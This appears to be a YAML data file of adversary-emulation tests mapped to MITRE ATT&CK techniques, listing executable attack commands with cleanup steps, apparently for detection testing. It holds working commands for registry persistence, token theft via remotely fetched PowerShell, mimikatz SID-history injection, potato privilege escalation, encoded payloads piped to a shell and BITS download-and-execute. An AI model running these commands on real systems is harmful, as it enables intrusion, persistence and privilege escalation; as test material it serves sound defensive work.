    - name: Modify EnableNonTPM Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v EnableNonTPM /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v EnableNonTPM /f
      timeout: 120
      elevation_required: true
    - name: Modify UsePartialEncryptionKey Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UsePartialEncryptionKey /f
      timeout: 120
      elevation_required: true
    - name: Modify UsePIN Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UsePIN /t REG_DWORD /d 2 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UsePIN /f
      timeout: 120
      elevation_required: true
    - name: Abusing Windows TelemetryController Registry Key for Persistence
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey" /t REG_SZ /v Command /d C:\Windows\System32\notepad.exe /f
      cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey" /f
      timeout: 120
      elevation_required: true
    - name: Modify RDP-Tcp Initial Program Registry Entry
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v fInheritInitialProgram /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
      cleanup: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "" /f
      timeout: 120
      elevation_required: true
    - name: Abusing MyComputer Disk Cleanup Path for Persistence
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\cleanmgr.exe /D %c" /f
      timeout: 120
      elevation_required: true
    - name: Abusing MyComputer Disk Fragmentation Path for Persistence
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\dfrgui.exe" /f
      timeout: 120
      elevation_required: true
    - name: Abusing MyComputer Disk Backup Path for Persistence
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%SystemRoot%\system32\sdclt.exe" /f
      timeout: 120
      elevation_required: true
    - name: Adding custom paths for application execution
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe" /t REG_SZ /d C:\Windows\System32\notepad.exe /f
      cleanup: |-
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe" /v (Default) /f
        reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe" /t REG_SZ /d "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" /f
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1112
  is_safe: false
- id: T1127
  name: Trusted Developer Utilities Proxy Execution
  description: 'Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Lolbin Jsc.exe compile javascript to exe
      type: cmd
      platform: windows
      command: |-
        copy "PathToAtomicsFolder\T1127\src\hello.js" %TEMP%\hello.js
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe %TEMP%\hello.js
      cleanup: |-
        del %TEMP%\hello.js
        del %TEMP%\hello.exe
      timeout: 120
    - name: Lolbin Jsc.exe compile javascript to dll
      type: cmd
      platform: windows
      command: |-
        copy "PathToAtomicsFolder\T1127\src\LibHello.js" %TEMP%\LibHello.js
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library %TEMP%\LibHello.js
      cleanup: |-
        del %TEMP%\LibHello.js
        del %TEMP%\LibHello.dll
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1127
  is_safe: false
- id: T1127.001
  name: MSBuild
  description: |-
    Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

    Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual B...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: MSBuild Bypass Using Inline Tasks (C#)
      type: cmd
      platform: windows
      command: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj"
      timeout: 120
    - name: MSBuild Bypass Using Inline Tasks (VB)
      type: cmd
      platform: windows
      command: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe "PathToAtomicsFolder\T1127.001\src\vb.xml"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1127/001
  is_safe: false
- id: T1134.001
  name: Token Impersonation/Theft
  description: |-
    Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

    An adversary may perform [T...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Named pipe client impersonation
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
      timeout: 120
      elevation_required: true
    - name: '`SeDebugPrivilege` token duplication'
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
      timeout: 120
      elevation_required: true
    - name: Launch NSudo Executable
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1134.001\bin\NSudoLG.exe" -Argument "-U:T -P:E cmd"
        Start-Sleep -Second 5
        Stop-Process -Name "cmd" -force -erroraction silentlycontinue
      timeout: 120
    - name: Bad Potato
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        Start-Process .\BadPotato.exe notepad.exe
        Start-Sleep -Second 20
        Stop-Process -Name "notepad" -force -erroraction silentlycontinue
        Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
      cleanup: taskkill /f /im notepad.exe
      timeout: 120
      elevation_required: true
    - name: Juicy Potato
      type: powershell
      platform: windows
      command: cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
      cleanup: |-
        get-ciminstance Win32_Process | where-object { $_.Path -eq "$env:windir\system32\notepad.exe" } | invoke-cimmethod -methodname "terminate" | out-null
        get-ciminstance Win32_Process | where-object { $_.Path -eq "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe" } | invoke-cimmethod -methodname "terminate" | out-null
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1134/001
  is_safe: false
- id: T1134.002
  name: Create Process with Token
  description: |-
    Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

    Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to b...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Access Token Manipulation
      type: powershell
      platform: windows
      command: |-
        Set-ExecutionPolicy -Scope Process Bypass -Force
        $owners = @{}
        gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
        Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
        & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
      timeout: 120
      elevation_required: true
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1134/002
  is_safe: false
- id: T1134.004
  name: Parent PID Spoofing
  description: 'Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Window...'
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Parent PID Spoofing using PowerShell
      type: powershell
      platform: windows
      command: |-
        . "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
        $ppid=Get-Process explorer | select -expand id
        PPID-Spoof -ppid $ppid -spawnto "C:\Program Files\Internet Explorer\iexplore.exe" -dllpath "PathToAtomicsFolder\T1134.004\bin\calc.dll"
      cleanup: |-
        Stop-Process -Name "calculator" -ErrorAction Ignore
        Stop-Process -Name "iexplore" -ErrorAction Ignore
      timeout: 120
    - name: Parent PID Spoofing - Spawn from Current Process
      type: powershell
      platform: windows
      command: Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID
      timeout: 120
    - name: Parent PID Spoofing - Spawn from Specified Process
      type: powershell
      platform: windows
      command: Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123
      timeout: 120
    - name: Parent PID Spoofing - Spawn from svchost.exe
      type: powershell
      platform: windows
      command: Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter "Name = 'svchost.exe' AND CommandLine LIKE '%'" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10'
      timeout: 120
    - name: Parent PID Spoofing - Spawn from New Process
      type: powershell
      platform: windows
      command: Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10'
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1134/004
  is_safe: false
- id: T1134.005
  name: SID-History Injection
  description: 'Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values...'
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Injection SID-History with mimikatz
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username" "exit"
      cleanup: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe "sid::clear /sam:$env:username" "exit"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1134/005
  is_safe: false
- id: T1140
  name: Deobfuscate/Decode Files or Information
  description: |-
    Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

    One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable e...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Deobfuscate/Decode Files Or Information
      type: cmd
      platform: windows
      command: |-
        certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
        certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
      cleanup: |-
        del %temp%\T1140_calc.txt >nul 2>&1
        del %temp%\T1140_calc_decoded.exe >nul 2>&1
      timeout: 120
    - name: Certutil Rename and Decode
      type: cmd
      platform: windows
      command: |-
        copy %windir%\system32\certutil.exe %temp%\tcm.tmp
        %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt
        %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
      cleanup: |-
        del %temp%\tcm.tmp >nul 2>&1
        del %temp%\T1140_calc2.txt >nul 2>&1
        del %temp%\T1140_calc2_decoded.exe >nul 2>&1
      timeout: 120
    - name: Base64 decoding with Python
      type: sh
      platform: linux
      command: |-
        ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("Hello from Atomic Red Team test T1140!".encode());print(enc.decode())')
        python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
        echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
        echo $ENCODED > /tmp/T1140.encoded && python3 -c "import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())"
      timeout: 60
    - name: Base64 decoding with Python
      type: sh
      platform: macos
      command: |-
        ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("Hello from Atomic Red Team test T1140!".encode());print(enc.decode())')
        python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
        python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
        echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
        echo $ENCODED > /tmp/T1140.encoded && python3 -c "import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())"
      timeout: 60
    - name: Base64 decoding with Perl
      type: sh
      platform: linux
      command: |-
        ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));")
        perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
        echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
        echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,"<","/tmp/T1140.encoded");print(decode_base64(<$f>));'
      timeout: 60
    - name: Base64 decoding with Perl
      type: sh
      platform: macos
      command: |-
        ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));")
        perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
        echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
        echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,"<","/tmp/T1140.encoded");print(decode_base64(<$f>));'
      timeout: 60
    - name: Base64 decoding with shell utilities
      type: sh
      platform: linux
      command: |-
        ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)
        printf $ENCODED | base64 -d
        echo $ENCODED | base64 -d
        echo $(echo $ENCODED) | base64 -d
        echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d
        echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d
        bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
      timeout: 60
    - name: Base64 decoding with shell utilities
      type: sh
      platform: macos
      command: |-
        ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)
        printf $ENCODED | base64 -d
        echo $ENCODED | base64 -d
        echo $(echo $ENCODED) | base64 -d
        echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d
        echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d
        bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
      timeout: 60
    - name: Base64 decoding with shell utilities (freebsd)
      type: sh
      platform: linux
      command: |-
        ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | b64encode -r -)
        printf $ENCODED | b64decode -r
        echo $ENCODED | b64decode -r
        echo $(echo $ENCODED) | b64decode -r
        echo $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && b64decode -r < /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r
        echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r
      timeout: 60
    - name: FreeBSD b64encode Shebang in CLI
      type: sh
      platform: linux
      command: |-
        echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
        echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh
      timeout: 60
    - name: Hex decoding with shell utilities
      type: sh
      platform: linux
      command: |-
        ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)
        printf $ENCODED | xxd -r -p
        echo $ENCODED | xxd -r -p
        echo $(echo $ENCODED) | xxd -r -p
        echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p
        echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p
      timeout: 60
    - name: Hex decoding with shell utilities
      type: sh
      platform: macos
      command: |-
        ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)
        printf $ENCODED | xxd -r -p
        echo $ENCODED | xxd -r -p
        echo $(echo $ENCODED) | xxd -r -p
        echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded
        echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p
        echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p
      timeout: 60
    - name: Linux Base64 Encoded Shebang in CLI
      type: sh
      platform: linux
      command: |-
        echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash
      timeout: 60
    - name: Linux Base64 Encoded Shebang in CLI
      type: sh
      platform: macos
      command: |-
        echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
        echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash
      timeout: 60
    - name: XOR decoding and command execution using Python
      type: bash
      platform: linux
      command: 'python3 -c ''import base64; import subprocess; xor_decrypt = lambda text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = "AAkqKQEM"; key = "waEHleblxiQjoxFJQaIMLdHKz"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'''
      timeout: 60
    - name: XOR decoding and command execution using Python
      type: bash
      platform: macos
      command: 'python3 -c ''import base64; import subprocess; xor_decrypt = lambda text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = "AAkqKQEM"; key = "waEHleblxiQjoxFJQaIMLdHKz"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'''
      timeout: 60
    - name: Expand CAB with expand.exe
      type: cmd
      platform: windows
      command: |-
        mkdir "%TEMP%\art-expand-out" >nul 2>&1
        echo hello from atomic red team > "PathToAtomicsFolder\T1140\src\art-expand-source.txt"
        makecab "PathToAtomicsFolder\T1140\src\art-expand-source.txt" "%TEMP%\art-expand-test.cab"
        pushd "%TEMP%\art-expand-out"
        expand "%TEMP%\art-expand-test.cab" -F:* .
        popd
      cleanup: |-
        del "PathToAtomicsFolder\T1140\src\art-expand-source.txt" >nul 2>&1
        del "%TEMP%\art-expand-test.cab" >nul 2>&1
        rmdir "%TEMP%\art-expand-out" /s /q >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1140
  is_safe: false
- id: T1197
  name: BITS Jobs
  description: 'Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) w...'
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - persistence
  platforms:
    - windows
  executors:
    - name: Bitsadmin Download (cmd)
      type: cmd
      platform: windows
      command: bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1
      cleanup: del %temp%\bitsadmin1_flag.ps1 >nul 2>&1
      timeout: 120
    - name: Bitsadmin Download (PowerShell)
      type: powershell
      platform: windows
      command: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1
      cleanup: Remove-Item $env:TEMP\bitsadmin2_flag.ps1 -ErrorAction Ignore
      timeout: 120
    - name: Persist, Download, & Execute
      type: cmd
      platform: windows
      command: |-
        bitsadmin.exe /create AtomicBITS
        bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1
        bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL
        bitsadmin.exe /resume AtomicBITS
        ping -n 5 127.0.0.1 >nul 2>&1
        bitsadmin.exe /complete AtomicBITS
      cleanup: del %temp%\bitsadmin3_flag.ps1 >nul 2>&1
      timeout: 120
    - name: Bits download using desktopimgdownldr.exe (cmd)
      type: cmd
      platform: windows
      command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
      cleanup: del C:\Windows\Temp\Personalization\LockScreenImage\*.md >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1197
  is_safe: false
- id: T1202
  name: Indirect Command Execution
  description: Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Indirect Command Execution - pcalua.exe
      type: cmd
      platform: windows
      command: |-
        pcalua.exe -a calc.exe
        pcalua.exe -a C:\Windows\System32\calc.exe
      timeout: 120
    - name: Indirect Command Execution - forfiles.exe
      type: cmd
      platform: windows
      command: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
      timeout: 120
    - name: Indirect Command Execution - conhost.exe
      type: cmd
      platform: windows
      command: conhost.exe "notepad.exe"
      timeout: 120
    - name: Indirect Command Execution - Scriptrunner.exe
      type: powershell
      platform: windows
      command: Scriptrunner.exe -appvscript "C:\Windows\System32\calc.exe"
      timeout: 120
    - name: Indirect Command Execution - RunMRU Dialog
      type: powershell
      platform: windows
      command: |-
        # Copy command to clipboard
        Set-Clipboard -Value 'calc.exe'

        # Open Run dialog
        Start-Process -FilePath "powershell" -ArgumentList "-c (New-Object -ComObject 'Shell.Application').FileRun()" -WindowStyle Hidden

        # Wait for Run dialog to open
        Start-Sleep -Seconds 1

        # Paste command and execute
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait('^v')
        Start-Sleep -Milliseconds 500
        [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1202
  is_safe: false
- id: T1207
  name: Rogue Domain Controller
  description: 'Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, includi...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: DCShadow (Active Directory)
      type: powershell
      platform: windows
      command: |-
        # starting fake DC server, as SYSTEM (required)
        $dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"
        Remove-Item $dc_output_file -ErrorAction Ignore
